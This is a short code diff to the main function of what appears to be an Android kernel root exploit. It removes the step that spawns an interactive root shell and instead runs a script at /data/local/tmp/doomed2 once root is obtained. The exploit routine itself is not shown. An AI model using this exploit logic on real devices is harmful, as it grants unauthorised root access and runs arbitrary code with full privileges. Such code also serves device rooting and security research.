@@ -93,6 +93,7 @@ run_exploit(void)
 int
 main(int argc, char **argv)
 {
+
   set_kernel_phys_offset(0x200000);
   remap_pfn_range = get_remap_pfn_range_address();
   if (!remap_pfn_range) {
@@ -110,9 +111,10 @@ main(int argc, char **argv)
   if (getuid() != 0) {
     printf("Failed to obtain root privilege.\n");
     exit(EXIT_FAILURE);
+  } else {
+    printf("Launching auto-root script!\n");
+    system("/system/bin/sh /data/local/tmp/doomed2");
   }
-
-  system("/system/bin/sh");
 
   exit(EXIT_SUCCESS);
 }
